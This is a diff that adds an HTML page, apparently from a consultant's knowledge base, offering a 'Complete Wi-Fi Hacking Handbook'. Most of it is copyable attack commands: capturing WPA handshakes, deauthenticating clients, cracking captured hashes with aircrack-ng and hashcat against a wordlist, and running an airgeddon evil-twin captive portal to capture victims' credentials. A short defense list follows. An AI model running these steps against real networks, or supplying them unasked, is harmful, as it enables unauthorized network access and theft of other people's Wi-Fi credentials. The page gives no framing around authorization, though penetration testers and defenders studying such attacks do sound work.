@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WiFi Hacking Guide | Network Security | Saikumar Raju</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>/* same base styles as previous */</style>
+</head>
+<body>
+  <!-- Navigation -->
+  <main>
+    <div class="container">
+      <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Network Security</a> / WiFi Hacking</div>
+      <div class="page-header">
+        <h1>📡 Complete Wi‑Fi Hacking Handbook</h1>
+      </div>
+
+      <div class="content-section">
+        <h2>🛠️ Prerequisites</h2>
+        <ul>
+          <li>Wireless adapter that supports monitor mode and packet injection (e.g., Alfa AWUS036ACH)</li>
+          <li>Kali Linux or similar</li>
+          <li>Tools: aircrack‑ng, aireplay‑ng, airodump‑ng, airmon‑ng, hashcat, wifite, airgeddon</li>
+        </ul>
+      </div>
+
+      <div class="content-section">
+        <h2>1. Capture 4‑Way Handshake</h2>
+        <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Put card in monitor mode
+sudo airmon-ng start wlan0
+
+# Scan for networks
+sudo airodump-ng wlan0mon
+
+# Capture handshake (replace channel, BSSID, interface)
+sudo airodump-ng -c 11 --bssid EA:75:F8:98 -w hack1 wlan0mon
+
+# Deauthenticate client to force reconnection (second terminal)
+sudo aireplay-ng -0 5 -a EA:75:F8:98 wlan0mon</pre>
+        </div>
+        <p>Wireshark filter: <code>eapol</code> to see the 4 messages.</p>
+      </div>
+
+      <div class="content-section">
+        <h2>2. Cracking the Password</h2>
+        <h3>Aircrack‑ng</h3>
+        <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt</pre>
+        </div>
+        <h3>Wifite + Hashcat</h3>
+        <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Use wifite to capture handshake
+sudo wifite
+
+# Convert cap to hccapx
+cap2hccapx hack1-01.cap hack1.hccapx
+
+# Crack with hashcat
+hashcat -m 2500 hack1.hccapx /usr/share/wordlists/rockyou.txt</pre>
+        </div>
+        <h3>hcxdumptool + hashcat (modern)</h3>
+        <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>sudo systemctl stop NetworkManager
+sudo hcxdumptool -i wlan0 -o dumpfile.pcapng
+hcxpcapngtool -o hash.hc22000 dumpfile.pcapng
+hashcat -m 22000 hash.hc22000 rockyou.txt</pre>
+        </div>
+      </div>
+
+      <div class="content-section">
+        <h2>3. Evil‑Twin Attack with Airgeddon</h2>
+        <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
+cd airgeddon
+sudo bash airgeddon.sh</pre>
+        </div>
+        <ul>
+          <li>Select interface → put in monitor mode</li>
+          <li>Choose “Evil Twin attacks” → “Create an Evil Twin”</li>
+          <li>Select target AP, choose channel, start captive portal</li>
+          <li>Victim connects → credentials captured</li>
+        </ul>
+      </div>
+
+      <div class="content-section">
+        <h2>4. Packet Injection Test</h2>
+        <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre># Test injection on specific AP
+sudo aireplay-ng -9 -a EA:75:F8:98 wlan0mon</pre>
+        </div>
+      </div>
+
+      <div class="content-section">
+        <h2>🛡️ Mitigation / Defense</h2>
+        <ul>
+          <li>Use WPA3 (if supported) or strong WPA2 passphrase (>12 chars, complex)</li>
+          <li>Disable WPS</li>
+          <li>Enable 802.11w (Management Frame Protection)</li>
+          <li>Regularly update router firmware</li>
+          <li>Monitor for rogue APs</li>
+        </ul>
+      </div>
+
+      <div class="content-section">
+        <h2>📚 References</h2>
+        <ul>
+          <li><a href="https://www.aircrack-ng.org/" target="_blank">Aircrack‑ng</a></li>
+          <li><a href="https://hashcat.net/hashcat/" target="_blank">Hashcat</a></li>
+          <li><a href="https://github.com/v1s1t0r1sh3r3/airgeddon" target="_blank">Airgeddon</a></li>
+        </ul>
+      </div>
+
+      <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Network Security</a>
+    </div>
+  </main>
+  <footer><p>Saikumar Raju — Cybersecurity Consultant | WiFi Hacking Guide</p></footer>
+  <script>/* copy and dark mode */</script>
+</body>
+</html>
